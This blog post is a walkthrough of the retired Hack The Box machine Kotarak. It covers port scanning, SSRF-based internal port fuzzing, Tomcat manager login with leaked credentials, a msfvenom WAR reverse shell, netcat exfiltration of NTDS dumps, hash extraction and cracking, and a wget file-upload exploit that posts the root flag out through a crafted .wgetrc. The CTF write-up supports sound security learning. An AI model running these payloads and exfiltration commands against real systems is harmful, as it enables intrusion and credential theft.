---
layout: post
title: "Kotarak"
categories: HTB-Walkthrough
---

![kotarak](/assets/img/kotarak/kotarak1.png)

Kotarak is another OSCP-like box from the HTB 'retired' archive. Its a little more difficult than some
of the other boxes on the list, but in reality it means that there are more phases to progress through than an easy
box, which might have just one or two.

Nmap is the best tool to initiate our enumeration, as always.

<h3>Nmap</h3>

`nmap -sV -Pn --min-rate 10000 10.10.10.55 -p- |tee -a kot.txt`

```

Nmap scan report for 10.10.10.55
Host is up (0.093s latency).
Not shown: 65517 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
2645/tcp  filtered novell-ipx-cmd
8009/tcp  open     ajp13          Apache Jserv (Protocol v1.3)
8080/tcp  open     http           Apache Tomcat 8.5.5
11363/tcp filtered unknown
12827/tcp filtered unknown
14800/tcp filtered unknown
27831/tcp filtered unknown
28137/tcp filtered unknown
38379/tcp filtered unknown
44288/tcp filtered unknown
45828/tcp filtered unknown
48201/tcp filtered unknown
49686/tcp filtered unknown
50982/tcp filtered unknown
60000/tcp open     http           Apache httpd 2.4.18 ((Ubuntu))
64465/tcp filtered unknown
64752/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

At first glance, it looks like there's a lot going on here, the only usual ports we might see are the ssh port (22) and the alternative http port (8080).
Many of the ports are filtered, so lets first enumerate the 'open' ports and services.

If the ssh service is not horribly out of date, or known to be vulnerable, its better to move on.
The 'http' port is often the first to test (if open) so I'll start with port 8080.

I add kotarak.htb to my /etc/hosts file, a customary measure that can sometimes reveal pages otherwise hidden when browsed to with just an ip address.

Browsing to http://kotarak.htb:8080 we immediately get a 'server status 404' the server has no page to display here...
Perhaps forced-browsing with `gobuster` will identify some directories to check out.

`gobuster dir -u http://10.10.10.55:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh`


While I'm waiting for gobuster to finish its search, I use `searchsploit` to look for public exploits for the `Tomcat` service.

![tomcat-searchsploit](/assets/img/kotarak/kotarak-tomcat-searchsploit.png)
 
It looks like there's a python exploit available that may work for the version running on the target.

I copy it to my pwd (present working directory) and have a read.

`searchsploit -m 42966`

```

  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/HTB/retired/kotarak/42966.py

```

It seems that we can generate a command webshell and upload it with the exploit with the following command:

`./42966.py -u http://10.10.10.55:8080 -p pwn`
 

<hr width="250" size="6">


Gobuster finishes, and presents some interesting directories to expore further:

![gobuster](/assets/img/kotarak/kotarak-gobuster.png)


The /docs and /examples directories offer nothing, but the message on the /manager page is a little different.

![manager](/assets/img/kotarak/kotarak-manager1.png)

Trying each of these suggestions results in a login popup box. The weak user/password creds that I try manually, like: admin/admin, tomcat/s3cret, admin/tomcat etc. fail. 

The /RELEASE-NOTES.txt page gives a list of api's that are included in this version by default, and may be helpful yet.

![bundled-api](/assets/img/kotarak/kotarak-bundled-api.png)



Before I move on, I test the python exploit, looking for a quick pwn, but it doesn't work.

![py-fail](/assets/img/kotarak/kotarak-py-fail.png)

No command seems to get a response, so I quit with the `q` command.

<hr width="250" size="6">

I decide to check out the other services running, looking first at the server running on port 60000.

It seems to be running a private web service.

![kotarak-60000](/assets/img/kotarak/kotarak-60000.png)


Trying `gobuster` on this port yields some positive results.

`gobuster dir -u http://kotarak.htb:60000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh`

Clicking on the links on the left is fruitless, but I type 'users' into the text-bar and get a blank screen, the url however suggests that the server is running php, and may be vulnerable to a directory-traversal, remote-file-inclusion, or local-file-inclusion.

```
http://kotarak.htb:60000/url.php?path=users
```

Initial attempts to traverse to /etc/passwd, to include reverse-shells, and webshells all fail however.


For example: Going through [Highon.Coffee's lfi cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet/)I try getting the server to serve up a local file...if the server is running php, 
then index.php is a good bet.

`http://kotarak.htb:60000/url.php?path=file://index.php`

the response is curt...

![try-harder](/assets/img/kotarak/kotarak-try-harder.png)



Stepping back a bit to consider what's going on here: what do we know so far about this server?

Its a private web browser, using php it serves files that aren't available publicly.

Its likely that they're hosted on an internal server or 'localhost' port.

[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery), is an exploit technique that can potentially take advantage of this scenario.


<hr width="250" size="6">


<h3>SSRF</h3>

I start by sending a simple curl request to the localhost to see if I get a response.

```

curl -i http://kotarak.htb:60000/url.php?path=http://localhost

HTTP/1.1 200 OK
Date: Wed, 04 Mar 2020 12:47:35 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 2
Content-Type: text/html; charset=UTF-8

```
It works, but there's no content; and force-browsing fails. Maybe its using a different internal port.

We can fuzz the port numbers, and test for responses.

I create a list of numbers to use with the fuzzer:

```
for i in $(seq 1 60000);do echo $i >> numbers.txt;done
```

<hr width="250" size="6">


<h3>Ffuf</h3>

[ffuf](https://github.com/ffuf/ffuf) is a great new fuzzer that's written in the `go` language, and it is fast!


`ffuf -w ./numbers.txt -u  http://kotarak.htb:60000/url.php?path=http://localhost:FUZZ`

The output moves quickly, the list is huge, and while we can see that it is successful in detecting content on many of the ports,
it is going to be a pain to go through.

I notice that the default filesize for a 'miss' is `2`, if we filter out those results by refining the command, we can get results showing only those ports with content.

`ffuf -w ./numbers.txt -u  http://kotarak.htb:60000/url.php?path=http://localhost:FUZZ -fs 2`


![fuff](/assets/img/kotarak/kotarak-ffuf2.png)

Impressive tool!

Now we have a nice neat list to go through with curl, and see what we can find.

`curl -i http://kotarak.htb:60000/url.php?path=http://localhost:888`



<hr width="250" size="6">


Port 888 seems to be hosting a file server, browsing to it with firefox we get a better picture.

![888](/assets/img/kotarak/kotarak-888.png)



First I click the `tetris.c` link.

The website redirects me to `http://kotarak.htb:60000/url.php?doc=tetris.c` and the page is blank.

I need to approach it using the ssrf url, like this...

`http://kotarak.htb:60000/url.php?path=http://localhost:888?doc=tetris.c`

I get page content, then download the file with wget.

```
wget http://kotarak.htb:60000/url.php?path=http://localhost:888?doc=tetris.c
```

I'm not a massive fan, so I don't compile it to play, instead I try out the other links.

Next is 'backup', the page turns up blank, but checking the page-source there is content.

`view-source:http://kotarak.htb:60000/url.php?path=http://localhost:888?doc=backup`

![tomcat-creds](/assets/img/kotarak/kotarak-tomcat-creds.png)


<h3>BINGO !!!</h3>

```
username="admin" password="3@g01PdhB!"
```

<hr width="250" size="6">


Returning to port 8080, we can now login with the found creds.

![tomcat-login](/assets/img/kotarak/kotarak-tomcat-login.png)


And we are greeted with the familiar tomcat dashboard.


![tomcat-dash](/assets/img/kotarak/kotarak-tomcat1.png)


<hr width="250" size="6">


<h3>WAR</h3>

First lets create an evil war file to upload, then execute.

```
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=6969 -f war -o evil.war

Payload size: 13398 bytes
Final size of war file: 13398 bytes
Saved as: evil.war
```


Set a netcat listener

`nc -nlvp 6969`


Then click on `/evil`

![evil war](/assets/img/kotarak/kotarak-evil-war.png)

and catch the reverse-shell!


```

root@kali:~/HTB/retired/kotarak# nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.55] 49382
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
whoami
tomcat
python -c 'import pty;pty.spawn("/bin/bash")'
tomcat@kotarak-dmz:/$ ls
ls
backups  dev   lib    libx32      mnt   root  snap  tmp  vmlinuz
bin      etc   lib32  lost+found  opt   run   srv   usr  vmlinuz.old
boot     home  lib64  media       proc  sbin  sys   var
tomcat@kotarak-dmz:/$ ls /home
ls /home
atanas  tomcat

```



The user.txt flag is in atanas' home directory, and we can't read it yet!


<hr width="250" size="6">


<h3>Privilege Escalation</h3>

Looking around `tomcat`'s home directory we find something interesting.

```

tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin

```

This looks like data collected on a penetration test, using `Impacket's psexec`...I download it to my Kali VM.


On Kali I do:

```
nc -nlvp 999 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
listening on [any] 999 ...
```


On the target I do:

```
nc -nv 10.10.14.14 999 nc -nlvp 999 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
```

Execute the listener first.

Repeat the process with the other file.



<hr width="250" size="6">


One of [Raj Candel's Blog](https://www.hackingarticles.in/3-ways-extract-password-hashes-from-ntds-dit/) articles gives us a method to extract the password hashes from the .dit file.

First I rename the `.bin` file as 'SYSTEM', and the `.dit` file as 'ntds.dit', which matches Raj's blog, and makes them less unweildy.

Extract the information with the command:

```
python /opt/impacket/examples/secretsdump.py -system /root/HTB/retired/kotarak/SYSTEM -ntds /root/HTB/retired/kotarak/ntds.dit LOCAL
```

This works, and the output follows...

```

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from /root/HTB/retired/kotarak/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys from /root/HTB/retired/kotarak/ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:6c53b16d11a496d0535959885ea7c79c04945889028704e2a4d1ca171e4374e2
Administrator:aes128-cts-hmac-sha1-96:e2a25474aa9eb0e1525d0f50233c0274
Administrator:des-cbc-md5:75375eda54757c2f
WIN-3G2B0H151AC$:aes256-cts-hmac-sha1-96:84e3d886fe1a81ed415d36f438c036715fd8c9e67edbd866519a2358f9897233
WIN-3G2B0H151AC$:aes128-cts-hmac-sha1-96:e1a487ca8937b21268e8b3c41c0e4a74
WIN-3G2B0H151AC$:des-cbc-md5:b39dc12a920457d5
WIN-3G2B0H151AC$:rc4_hmac:668d49ebfdb70aeee8bcaeac9e3e66fd
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8
krbtgt:aes128-cts-hmac-sha1-96:8b96c9c8ea354109b951bfa3f3aa4593
krbtgt:des-cbc-md5:10ef08047a862046
krbtgt:rc4_hmac:ca1ccefcb525db49828fbb9d68298eee
WIN2K8$:aes256-cts-hmac-sha1-96:289dd4c7e01818f179a977fd1e35c0d34b22456b1c8f844f34d11b63168637c5
WIN2K8$:aes128-cts-hmac-sha1-96:deb0ee067658c075ea7eaef27a605908
WIN2K8$:des-cbc-md5:d352a8d3a7a7380b
WIN2K8$:rc4_hmac:160f6c1db2ce0994c19c46a349611487
WINXP1$:aes256-cts-hmac-sha1-96:347a128a1f9a71de4c52b09d94ad374ac173bd644c20d5e76f31b85e43376d14
WINXP1$:aes128-cts-hmac-sha1-96:0e4c937f9f35576756a6001b0af04ded
WINXP1$:des-cbc-md5:984a40d5f4a815f2
WINXP1$:rc4_hmac:6f5e87fd20d1d8753896f6c9cb316279
WIN2K31$:aes256-cts-hmac-sha1-96:f486b86bda928707e327faf7c752cba5bd1fcb42c3483c404be0424f6a5c9f16
WIN2K31$:aes128-cts-hmac-sha1-96:1aae3545508cfda2725c8f9832a1a734
WIN2K31$:des-cbc-md5:4cbf2ad3c4f75b01
WIN2K31$:rc4_hmac:cdd7a7f43d06b3a91705900a592f3772
WIN7$:aes256-cts-hmac-sha1-96:b9921a50152944b5849c706b584f108f9b93127f259b179afc207d2b46de6f42
WIN7$:aes128-cts-hmac-sha1-96:40207f6ef31d6f50065d2f2ddb61a9e7
WIN7$:des-cbc-md5:89a1673723ad9180
WIN7$:rc4_hmac:24473180acbcc5f7d2731abe05cfa88c
atanas:aes256-cts-hmac-sha1-96:933a05beca1abd1a1a47d70b23122c55de2fedfc855d94d543152239dd840ce2
atanas:aes128-cts-hmac-sha1-96:d1db0c62335c9ae2508ee1d23d6efca4
atanas:des-cbc-md5:6b80e391f113542a
[*] Cleaning up... 

```

I can use `john` or `hashcat` to crack these ntlm hashes, or save time with [crackstation](https://crackstation.net/)


![crackstation](/assets/img/kotarak/kotarak-crackstation.png)

They are cracked almost instantly!

```
Administrator:f16tomcat!
atanas:Password123!
```


<hr width="250" size="6">


To get atanas' shell, we can either do `ssh atanas@localhost`, or just `su atanas` and type in the password `f16tomcat!`

Now we can grab the user.txt flag...

```
atanas@kotarak-dmz:~$ cat user.txt
93xxxxxxxxxxxxxxxxxxxxxxxxxxxxe8
```


`sudo -l` doesn't work, as atanas cannot do sudo on kotarak!

looking for suid files:
`find / -perm -u=s -type f 2>/dev/null`

```
atanas@kotarak-dmz:~$ find / -perm -u=s -type f 2>/dev/null
/var/tmp/mkinitramfs_CAAb2h/bin/ntfs-3g
/var/tmp/mkinitramfs_IKmJUU/bin/ntfs-3g
/bin/ping
/bin/ping6
/bin/mount
/bin/ntfs-3g
/bin/su
/bin/fusermount
/bin/umount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/ubuntu-core-launcher
/usr/bin/newgidmap
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/authbind/helper
/usr/lib/eject/dmcrypt-get-device

```

There's a few unusual things here, but before looking deeper, I have more of a look around.

Unusually we are permitted acces to the /root folder.

```

atanas@kotarak-dmz:~$ cd /root
atanas@kotarak-dmz:/root$ ls
app.log  flag.txt
atanas@kotarak-dmz:/root$ cat flag.txt
Getting closer! But what you are looking for can't be found here.
atanas@kotarak-dmz:/root$ ls -la
total 48
drwxrwxrwx  6 root   root 4096 Sep 19  2017 .
drwxr-xr-x 27 root   root 4096 Aug 29  2017 ..
-rw-------  1 atanas root  333 Jul 20  2017 app.log
-rw-------  1 root   root  499 Jan 18  2018 .bash_history
-rw-r--r--  1 root   root 3106 Oct 22  2015 .bashrc
drwx------  3 root   root 4096 Jul 21  2017 .cache
drwxr-x---  3 root   root 4096 Jul 19  2017 .config
-rw-------  1 atanas root   66 Aug 29  2017 flag.txt
-rw-------  1 root   root  188 Jul 12  2017 .mysql_history
drwxr-xr-x  2 root   root 4096 Jul 12  2017 .nano
-rw-r--r--  1 root   root  148 Aug 17  2015 .profile
drwx------  2 root   root 4096 Jul 19  2017 .ssh

```

There's no `root.txt` flag, and although we can read 'flag.txt' we find we have to look for the root flag elsewhere.

We can also read `app.log`

```

atanas@kotarak-dmz:/root$ cat app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

```

It shows a connection from IP `10.0.3.133` attempting to GET `archive.tar.gz` with a `wget` command, but the request is rejected as the file is not found!

`wget 1.16` may help, I check my version of wget on Kali with `wget --version` and find it to be '1.20.3' so this is an old version mentioned...

I do the same on Kotarak and find it's running '1.17.1'.

Searching online, I find an [Arbitrary File Upload](https://www.exploit-db.com/exploits/40064) exploit for versions less than 1.18 on exploitdb.



<hr width="250" size="6">

`netstat -antup` shows something interesting which ties in with the above log.

```

atanas@kotarak-dmz:/root$ netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:200           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:110           0.0.0.0:*               LISTEN      -               
tcp        0      0 10.0.3.1:53             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:888           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:90            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:320           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:40434         127.0.0.1:40434         ESTABLISHED -               
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -               
tcp6       0      0 fe80::1:13128           :::*                    LISTEN      -               
tcp6       0      0 :::8009                 :::*                    LISTEN      -               
tcp6       0      0 :::8080                 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::60000                :::*                    LISTEN      -               
tcp6       0      0 ::1:40344               ::1:40344               ESTABLISHED -               
tcp6       0   1164 10.10.10.55:49382       10.10.14.14:6969        ESTABLISHED -               
udp        0      0 10.0.3.1:53             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -   

```

We see an UDP domain name server running.

`ifconfig` confirms that Kotarak is running an LXC container with the subnet of 10.0.3.1

```

atanas@kotarak-dmz:/root$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:26:f8  
          inet addr:10.10.10.55  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:26f8/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:26f8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3881084 errors:0 dropped:11 overruns:0 frame:0
          TX packets:3811814 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:583524697 (583.5 MB)  TX bytes:4103744933 (4.1 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:653694 errors:0 dropped:0 overruns:0 frame:0
          TX packets:653694 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:41288414 (41.2 MB)  TX bytes:41288414 (41.2 MB)

lxcbr0    Link encap:Ethernet  HWaddr 00:16:3e:00:00:00  
          inet addr:10.0.3.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe00:0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:682 errors:0 dropped:0 overruns:0 frame:0
          TX packets:681 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:31988 (31.9 KB)  TX bytes:37248 (37.2 KB)

lxdbr0    Link encap:Ethernet  HWaddr 62:23:e1:78:65:32  
          inet6 addr: fe80::6023:e1ff:fe78:6532/64 Scope:Link
          inet6 addr: fe80::1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:470 (470.0 B)

vethWQI9F6 Link encap:Ethernet  HWaddr fe:f2:85:3f:21:23  
          inet6 addr: fe80::fcf2:85ff:fe3f:2123/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:682 errors:0 dropped:0 overruns:0 frame:0
          TX packets:689 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:41536 (41.5 KB)  TX bytes:37896 (37.8 KB)

``` 

The frequency of the requests in 'app.log' suggests that its a cronjob command, running an exploitable version of wget.

This is likely to be the best route to root!



<h3>Exploit-Wget</h3>

I download the exploit and copy it as `exploit-wget.py`, adjust the 'listen' ip addresses, and run an ftp server.

![exploit-nano](/assets/img/kotarak/kotarak-exploit-nano.png)

Send the exploit file to the target


Create .wgetrc containing the following...make sure its in the folder to be served by Twistd ftp server.

```
post_file = /root/root.txt
output_document = /etc/cron.d/wget-root-shell
```


Start the ftp server:

```
twistd -n ftp -p 21 -r /root/HTB/retired/kotarak/
```


Run the exploit - we need to use authbind to successfully run this or it will fail because the port is below
1024, so it requires elevated privs.

```
authbind python exploit-wget.py
```


After a wait, we get the contents of root.txt...

```

10.0.3.133 - - [04/Mar/2020 12:42:01] "GET /archive.tar.gz HTTP/1.1" 301 -
Sending redirect to ftp://anonymous@10.10.14.14:21/.wgetrc 

We have a volunteer requesting /archive.tar.gz by POST :)

Received POST from wget, this should be the extracted /etc/shadow file: 

---[begin]---
 95xxxxxxxxxxxxxxxxxxxxxxxxxxxx2c
 
---[eof]---

```


:)
